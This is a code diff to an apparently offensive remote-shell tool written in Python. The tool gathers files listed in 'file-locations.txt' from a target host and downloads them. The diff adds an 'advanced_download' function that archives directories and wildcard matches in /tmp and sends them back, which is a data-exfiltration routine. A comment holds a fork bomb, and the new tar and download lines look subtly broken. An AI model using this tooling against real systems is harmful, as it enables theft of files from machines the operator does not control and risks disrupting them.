@@ -9,6 +9,7 @@ import base64
 import pathlib
 import datetime
 import readline
+import uuid
 
 asciiflex = """
 ______  _____ ______   _   _            _  _ 
@@ -160,8 +161,8 @@ def gather_infos():  # every file of file-locations.txt until an empty line occu
     global target
     f = open("file-locations.txt", "r")
     while l := f.readline():
-        if l.strip():
-            shell("download "+l)
+        if l:=l.strip():
+            advanced_download(l)
         else:
             return f
     f.close()
@@ -174,14 +175,19 @@ def gather_more():  # every file after the empty line #TODO support for wildcard
     log("getting more information:")
     while l := f.readline():
         if l := l.strip():
-            if l.endswith("/"):
-                # tar -zcvf archive-name.tar.gz directory-name #tar -zcvf test.tar.gz -C ~/test .
-                name = l.split("/")[-2]
-                shell("tar -zcvf "+name+".tar.gz -C "+l+" .")
-                shell("download "+name+".tar.gz")
-            else:
-                shell("download "+l)
+            advanced_download(l)
+            
 
+def advanced_download(path):
+    if "*" in path or path.endswith("/"):
+        id=str(uuid.uuid4())
+        shell("mkdir /tmp/"+id)
+        shell("cp -r "+path+" /tmp/"+id)
+        name=path.replace("/","").replace("*","")
+        shell('tar -zcvf /tmp/'+name+'.tar.gz -C /tmp/'+id)
+        shell("download /tmp/"+name)
+    else:
+        shell("download "+path)
 
 def shell(command):
     global CWD
@@ -221,6 +227,7 @@ def disturbtion():  # :(){ :|:& };:
 def execFile(filename, myp):
     f = open(filename, "r")
     while l := f.readline():
+        print(Fore.MAGENTA+l.strip()+Style.RESET_ALL)
         myp.onecmd(l)
 
 
